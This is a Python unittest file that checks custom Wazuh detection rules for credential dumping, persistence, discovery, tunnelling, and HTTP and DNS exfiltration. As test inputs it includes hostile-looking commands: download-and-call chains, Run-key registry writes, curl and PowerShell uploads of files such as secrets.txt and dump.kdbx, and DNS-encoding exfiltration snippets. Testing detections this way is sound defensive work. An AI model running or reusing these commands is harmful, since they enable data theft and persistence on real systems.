#!/usr/bin/env python3
"""Regression checks for production-hardening changes to custom Wazuh rules."""

from pathlib import Path
import re
import unittest
import xml.etree.ElementTree as ET

from tests.analyze_dns_exfiltration_corpus import ENCODED_LABEL, analyze

RULES = Path(__file__).resolve().parents[1] / "rules"


def load_rules(filename: str) -> dict[str, ET.Element]:
    text = (RULES / filename).read_text(encoding="utf-8")
    root = ET.fromstring(f"<root>{text}</root>")
    return {rule.attrib["id"]: rule for rule in root.iter("rule")}


def containing_group(filename: str, rule_id: str) -> ET.Element:
    text = (RULES / filename).read_text(encoding="utf-8")
    root = ET.fromstring(f"<root>{text}</root>")
    for group in root.findall("group"):
        if any(rule.attrib.get("id") == rule_id for rule in group.iter("rule")):
            return group
    raise AssertionError(f"Rule {rule_id} has no containing group")


def child_text(rule: ET.Element, tag: str) -> str | None:
    child = rule.find(tag)
    return child.text if child is not None else None


def required_text(rule: ET.Element, tag: str) -> str:
    value = child_text(rule, tag)
    if value is None:
        raise AssertionError(f"rule {rule.attrib.get('id')} has no {tag}")
    return value


def field_pattern(rule: ET.Element, field_name: str) -> str:
    field = rule.find(f"field[@name='{field_name}']")
    if field is None or field.text is None:
        raise AssertionError(f"rule {rule.attrib.get('id')} has no populated field {field_name}")
    return field.text


class RuleHardeningTests(unittest.TestCase):
    def test_mssql_execution_rule_keeps_live_proven_parent(self) -> None:
        rules = load_rules("mssql_xp_cmdshell_detection.xml")
        self.assertEqual(child_text(rules["100541"], "if_sid"), "100300")

    def test_lsass_benign_reader_patterns_match_real_windows_paths(self) -> None:
        rules = load_rules("lsass_credential_dump_detection.xml")
        broad_exclusion = re.compile(field_pattern(rules["100421"], "win.eventdata.sourceImage"))
        suppression = re.compile(field_pattern(rules["100427"], "win.eventdata.sourceImage"))

        benign_paths = [
            r"C:\Windows\system32\wbem\wmiprvse.exe",
            r"C:\Windows\system32\svchost.exe",
            r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.25070.5-0\MsMpEng.exe",
        ]
        for path in benign_paths:
            self.assertIsNotNone(broad_exclusion.search(path), path)
            doubled = path.replace("\\", "\\\\")
            self.assertIsNotNone(broad_exclusion.search(doubled), doubled)
        for path in [
            r"C:\Windows\system32\svchost.exe",
            r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.25070.5-0\MsMpEng.exe",
        ]:
            self.assertIsNotNone(suppression.search(path), path)
            doubled = path.replace("\\", "\\\\")
            self.assertIsNotNone(suppression.search(doubled), doubled)
        parent = child_text(rules["100421"], "if_sid")
        self.assertIsNotNone(parent)
        self.assertIn("92900", parent.split(",") if parent else [])
        self.assertIsNone(broad_exclusion.search(r"C:\Users\Public\renamed-dumper.exe"))

    def test_cmd_download_then_call_matches_real_chain(self) -> None:
        rules = load_rules("cmd_detection.xml")
        fields = rules["100330"].findall("field[@name='win.eventdata.commandLine']")
        self.assertEqual(len(fields), 2)
        retrieval = re.compile(fields[0].text or "")
        execution = re.compile(fields[1].text or "")
        positive = r"cmd.exe /d /c curl.exe http://127.0.0.1:9/test.cmd -o %TEMP%\test.cmd & call %TEMP%\test.cmd"
        self.assertIsNotNone(retrieval.search(positive), positive)
        self.assertIsNotNone(execution.search(positive), positive)
        no_execution = r"cmd.exe /d /c curl.exe http://127.0.0.1:9/test.cmd -o %TEMP%\test.cmd & echo downloaded"
        self.assertIsNotNone(retrieval.search(no_execution), no_execution)
        self.assertIsNone(execution.search(no_execution))

    def test_cmd_run_key_supports_live_serialized_path_forms(self) -> None:
        rules = load_rules("cmd_detection.xml")
        fields = rules["100334"].findall("field[@name='win.eventdata.commandLine']")
        self.assertEqual(len(fields), 2)
        reg_add = re.compile(fields[0].text or "")
        run_key = re.compile(fields[1].text or "")
        for command in [
            r"cmd.exe /c reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Test /d cmd.exe /f",
            r"cmd.exe /c reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /d cmd.exe /f",
        ]:
            self.assertIsNotNone(reg_add.search(command), command)
            self.assertIsNotNone(run_key.search(command), command)
        wrong_key = r"cmd.exe /c reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Runaway /v Test /d cmd.exe /f"
        self.assertIsNotNone(reg_add.search(wrong_key), wrong_key)
        self.assertIsNone(run_key.search(wrong_key))

    def test_cmd_domain_discovery_matches_real_unc_share_syntax(self) -> None:
        rules = load_rules("cmd_detection.xml")
        domain_discovery = re.compile(field_pattern(rules["100312"], "win.eventdata.commandLine"))
        commands = [
            r"cmd.exe /c dir \\dc01\SYSVOL",
            r"cmd.exe /c type \\dc01\NETLOGON\logon.bat",
            r"cmd.exe /c net use \\dc01\ADMIN$",
            "cmd.exe /c dir " + ("\\" * 4) + "dc01" + ("\\" * 2) + "SYSVOL",
        ]
        for command in commands:
            self.assertIsNotNone(domain_discovery.search(command), command)
        false_positives = [
            r"cmd.exe /c dir \\fileserver\Public",
            "cmd.exe /c dir " + ("\\" * 4) + "fileserver" + ("\\" * 2) + "Public",
        ]
        for command in false_positives:
            self.assertIsNone(domain_discovery.search(command), command)

    def test_asrep_rc4_child_is_versioned(self) -> None:
        rules = load_rules("asrep_roasting_detection.xml")
        rc4 = rules["100414"]
        self.assertEqual(rc4.attrib.get("level"), "12")
        self.assertEqual(child_text(rc4, "if_sid"), "100411")
        self.assertEqual(field_pattern(rc4, "win.eventdata.ticketEncryptionType"), "^0x17$")
        self.assertEqual([item.text for item in rc4.findall("mitre/id")], ["T1558.004"])

    def test_winpeas_behavior_is_low_severity_without_unproven_correlation(self) -> None:
        rules = load_rules("winpeas_detection.xml")
        self.assertLessEqual(int(rules["100471"].attrib["level"]), 8)
        self.assertNotIn("100472", (RULES / "winpeas_detection.xml").read_text(encoding="utf-8"))

    def test_unix_shell_has_no_dead_raw_audit_parent(self) -> None:
        rules = load_rules("unix_shell_detection.xml")
        self.assertNotIn("100200", rules)
        self.assertFalse(any(child_text(rule, "if_sid") == "100200" for rule in rules.values()))

    def test_create_remote_thread_base_is_non_alerting(self) -> None:
        rules = load_rules("process_injection_detection.xml")
        base = rules["100478"]
        self.assertEqual(base.attrib.get("level"), "0")
        self.assertEqual(base.attrib.get("noalert"), "1")
        self.assertEqual(child_text(rules["100479"], "if_sid"), "100478")

    def test_ca_network_connection_is_supporting_low_severity_telemetry(self) -> None:
        rules = load_rules("certighost_detection.xml")
        callback = rules["100445"]
        self.assertLessEqual(int(callback.attrib["level"]), 5)
        self.assertIn("supporting", required_text(callback, "description").lower())

    def test_seatbelt_has_generic_metadata_parent_and_bounded_child(self) -> None:
        rules = load_rules("seatbelt_detection.xml")
        generic = rules["100542"]
        bounded = rules["100524"]
        self.assertEqual(child_text(generic, "if_sid"), "61603")
        self.assertIsNone(generic.find("mitre"))
        self.assertNotIn("discovery", containing_group("seatbelt_detection.xml", "100542").attrib["name"].lower())
        self.assertIsNotNone(generic.find("field[@name='win.eventdata.originalFileName']"))
        self.assertIsNotNone(generic.find("field[@name='win.eventdata.product']"))
        self.assertEqual(child_text(bounded, "if_sid"), "100542")
        self.assertIn("discovery", containing_group("seatbelt_detection.xml", "100524").attrib["name"].lower())
        command = bounded.find("field[@name='win.eventdata.commandLine']")
        self.assertIsNotNone(command)
        assert command is not None
        self.assertEqual(
            command.text,
            r'(?i)^\s*(?:\\?"[^"\r\n]+\\?"|\S+)\s+OSInfo\s+TokenGroups\s+PowerShell\s*$',
        )
        self.assertEqual([item.text for item in bounded.findall("mitre/id")], ["T1082", "T1069.002"])

    def test_chisel_has_hash_independent_behavior_visibility(self) -> None:
        rules = load_rules("chisel_detection.xml")
        behavior = rules["100543"]
        self.assertEqual(child_text(behavior, "if_sid"), "61603")
        fields = behavior.findall("field")
        self.assertTrue(any(f.attrib.get("name") == "win.eventdata.image" for f in fields))
        self.assertTrue(any(f.attrib.get("name") == "win.eventdata.commandLine" for f in fields))
        self.assertFalse(any(f.attrib.get("name") == "win.eventdata.hashes" for f in fields))
        self.assertEqual(child_text(rules["100526"], "if_sid"), "100525")
        self.assertNotIn("chisel", containing_group("chisel_detection.xml", "100543").attrib["name"].lower())
        self.assertIn("chisel", containing_group("chisel_detection.xml", "100525").attrib["name"].lower())
        self.assertIn("chisel", containing_group("chisel_detection.xml", "100526").attrib["name"].lower())

    def test_chisel_behavior_path_handles_wazuh_doubled_separators(self) -> None:
        rules = load_rules("chisel_detection.xml")
        image_field = rules["100543"].find("field[@name='win.eventdata.image']")
        self.assertIsNotNone(image_field)
        assert image_field is not None and image_field.text is not None
        observed = r"C:\\Users\\ADAM~1.WIL\\AppData\\Local\\Temp\\TunnelBehavior\\relay.exe"
        self.assertIsNotNone(re.search(image_field.text, observed))

    def test_http_curl_upload_grammar_is_broad_but_argument_bound(self) -> None:
        rules = load_rules("http_exfiltration_detection.xml")
        generic = re.compile(field_pattern(rules["100530"], "win.eventdata.commandLine"))
        positives = [
            r'\"C:\\Windows\\System32\\curl.exe\" --data-binary @C:\\Users\\u\\secrets.txt https://host/upload',
            r'curl.exe --data-binary="@C:\\Users\\u\\My Files\\archive.zip" https://host/upload',
            r'curl.exe --upload-file C:\\Temp\\dump.kdbx https://host/upload',
            r'curl.exe -T "C:\\Temp\\quarterly report.pdf" https://host/upload',
        ]
        negatives = [
            r'curl.exe --data-binary "status=ok" https://host/upload',
            r'curl.exe --version',
            r'curl.exe https://host/report.zip',
            r'curl.exe --upload-file https://host/report.zip',
            r'curl.exe --upload-file C:\\Temp\\dump.kdbx ftp://ftp.example/upload --next https://host/health',
        ]
        for command in positives:
            self.assertIsNotNone(generic.search(command), command)
        for command in negatives:
            self.assertIsNone(generic.search(command), command)

        sensitive = re.compile(field_pattern(rules["100531"], "win.eventdata.commandLine"))
        self.assertIsNotNone(sensitive.search(positives[0]))
        self.assertIsNotNone(sensitive.search(positives[2]))
        self.assertIsNone(sensitive.search(r'curl.exe --upload-file C:\\Temp\\health.json https://host/report.zip'))
        self.assertIsNone(sensitive.search(r'curl.exe --upload-file C:\\Temp\\health.json https://host/upload --next --upload-file C:\\Temp\\dump.kdbx ftp://ftp.example/upload'))

    def test_http_has_rename_resistant_curl_and_generic_powershell_layers(self) -> None:
        rules = load_rules("http_exfiltration_detection.xml")
        script_parent = child_text(rules["100532"], "if_sid")
        process_parents = (child_text(rules["100530"], "if_sid") or "").replace(" ", "").split(",")
        self.assertIn("67027", process_parents)
        self.assertIn("92031", process_parents)
        self.assertEqual(script_parent, "91816")
        self.assertEqual(child_text(rules["100547"], "if_sid"), "91802")
        self.assertEqual(
            field_pattern(rules["100547"], "win.eventdata.scriptBlockText"),
            field_pattern(rules["100532"], "win.eventdata.scriptBlockText"),
        )
        metadata = rules["100544"]
        self.assertEqual(child_text(metadata, "if_sid"), "61603")
        self.assertIsNotNone(metadata.find("field[@name='win.eventdata.originalFileName']"))
        names = " ".join(f.attrib.get("name", "") for f in metadata.findall("field"))
        self.assertNotIn("newProcessName", names)
        self.assertNotIn("hashes", names)

        ps = re.compile(field_pattern(rules["100532"], "win.eventdata.scriptBlockText"))
        positives = [
            'curl.exe --data-binary "@$p" "https://host/upload"',
            'curl.exe --upload-file $p https://host/upload --next https://host/health',
            'curl.exe https://host/health --next --upload-file $p https://host/upload',
            'Invoke-WebRequest -Uri https://host/upload -Method Put -InFile $p',
            r'Invoke-WebRequest -Uri \"https://host/upload\" -Method Put -InFile $p',
            '$wc.UploadFile("https://host/upload", $p)',
            'Start-BitsTransfer -TransferType Upload -Source $p -Destination https://host/upload',
            '$content=[Net.Http.StreamContent]::new($stream);$client.PostAsync("https://host/upload",$content)',
        ]
        for script in positives:
            self.assertIsNotNone(ps.search(script), script)
        self.assertIsNone(ps.search('Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search('curl.exe --data-binary "status=ok" https://host/telemetry'))
        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload --next https://host/health'))
        self.assertIsNone(ps.search('$wc.UploadFile("ftp://ftp.example/upload",$p);Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload && Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload || Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload | Invoke-WebRequest -Uri https://host/health -Method Get'))
        self.assertIsNone(ps.search("curl.exe --version && Write-Output '--upload-file $p https://host/upload'"))
        self.assertIsNone(ps.search("curl.exe --version || Write-Output '--upload-file $p https://host/upload'"))
        self.assertIsNone(ps.search("curl.exe --version | Write-Output '--upload-file $p https://host/upload'"))
        self.assertIsNone(ps.search('curl.exe --version && tool.exe --upload-file $p https://host/upload'))
        self.assertIsNone(ps.search("curl.exe --upload-file $p ftp://ftp.example/upload;$wc.DownloadString('https://host/health')"))
        self.assertIsNone(ps.search("$p=Join-Path $env:TEMP 'controlled.txt';Set-Content $p 'password=CONTROLLED';curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get"))

        high = rules["100545"]
        self.assertEqual(child_text(high, "if_sid"), "100532")
        self.assertEqual(child_text(rules["100548"], "if_sid"), "100547")
        self.assertEqual(
            field_pattern(rules["100548"], "win.eventdata.scriptBlockText"),
            field_pattern(high, "win.eventdata.scriptBlockText"),
        )
        self.assertGreater(int(high.attrib["level"]), int(rules["100532"].attrib["level"]))

    def test_dns_encoded_label_and_burst_layers_generalize_transport(self) -> None:
        rules = load_rules("dns_exfiltration_detection.xml")
        self.assertEqual(child_text(rules["100533"], "if_sid"), "60009")
        encoded = re.compile(field_pattern(rules["100533"], "win.eventdata.queryName"))
        self.assertIsNotNone(encoded.search("s.0.8.436c617373696669636174696f6e3d434f4e464944454e54.example"))
        self.assertIsNotNone(encoded.search("mfrggzdfmztwq2lkj5xw42lomv4gc3lqn5xw4zzomnxw2zls.example"))
        self.assertIsNotNone(encoded.search(("a" * 48) + ".example"))
        self.assertIsNone(encoded.search("dc01.simulation.local"))

        framed = re.compile(field_pattern(rules["100534"], "win.eventdata.queryName"))
        self.assertIsNotNone(framed.search("sess.1.5." + ("a" * 48) + ".example"))
        self.assertIsNone(framed.search("sess.1.5.normal." + ("a" * 48) + ".example"))

        burst = rules["100546"]
        self.assertEqual(child_text(burst, "if_matched_sid"), "100533")
        self.assertEqual(burst.attrib.get("frequency"), "9")
        self.assertEqual(burst.attrib.get("timeframe"), "15")
        self.assertEqual(child_text(burst, "same_field"), "win.system.processID")

    def test_dns_powershell_behavior_supports_hex_and_base64_dns_apis(self) -> None:
        rules = load_rules("dns_exfiltration_detection.xml")
        fields = [f.text or "" for f in rules["100535"].findall("field[@name='win.eventdata.scriptBlockText']")]
        self.assertEqual(len(fields), 3)
        patterns = [re.compile(x) for x in fields]
        positives = [
            "$b=[IO.File]::ReadAllBytes($p);$h=-join($b|%{$_.ToString('x2')});$c=$h.Substring(0,48);Resolve-DnsName -Name \"$c.x.lab\" -Server $s",
            "$b=Get-Content $p -Encoding Byte;$e=[Convert]::ToBase64String($b);$c=$e.Substring(0,48);[System.Net.Dns]::GetHostAddresses(\"$c.x.lab\")",
        ]
        for script in positives:
            self.assertTrue(all(p.search(script) for p in patterns), script)
        negatives = [
            "Resolve-DnsName dc01.simulation.local -Type A",
            "$b=[IO.File]::ReadAllBytes($p);$e=[Convert]::ToBase64String($b);Set-Content backup.txt $e;Resolve-DnsName api.example",
        ]
        for script in negatives:
            self.assertFalse(all(p.search(script) for p in patterns), script)

    def test_dns_corpus_analyzer_measures_same_process_sliding_window(self) -> None:
        self.assertEqual(
            ENCODED_LABEL.pattern,
            field_pattern(load_rules("dns_exfiltration_detection.xml")["100533"], "win.eventdata.queryName"),
        )

        def record(query: str, second: int, process_id: str = "42") -> dict:
            return {
                "data": {
                    "win": {
                        "system": {
                            "channel": "Microsoft-Windows-DNS-Client/Operational",
                            "eventID": "3006",
                            "processID": process_id,
                            "systemTime": f"2026-08-06T12:00:{second:02d}.1234567Z",
                        },
                        "eventdata": {"queryName": query},
                    }
                }
            }

        encoded = ("a" * 48) + ".example"
        records = [record("dc01.simulation.local", 0)]
        records.extend(record(encoded, second) for second in range(1, 6))
        records.extend(record(encoded, second, "99") for second in (1, 20))
        result = analyze(records, window_seconds=15)
        self.assertEqual(result["dns_event_count"], 8)
        self.assertEqual(result["candidate_event_count"], 7)
        self.assertEqual(result["process_bursts"][0]["max_in_window"], 5)

    def test_exfiltration_rule_ids_are_mapped_in_playbooks_and_dashboard(self) -> None:
        root = RULES.parent
        dashboard = (root / "dashboard_queries.md").read_text(encoding="utf-8")
        families = {
            "http_exfiltration_detection.xml": ("http_exfiltration_cmd.md", {"100530", "100531", "100532", "100544", "100545", "100547", "100548"}),
            "dns_exfiltration_detection.xml": ("dns_exfiltration_cmd.md", {"100533", "100534", "100535", "100546"}),
        }
        for xml_name, (playbook_name, expected) in families.items():
            self.assertEqual(set(load_rules(xml_name)), expected)
            playbook = (root / "tests" / playbook_name).read_text(encoding="utf-8")
            for rule_id in expected:
                self.assertIn(rule_id, playbook)
                self.assertIn(rule_id, dashboard)


if __name__ == "__main__":
    unittest.main(verbosity=2)
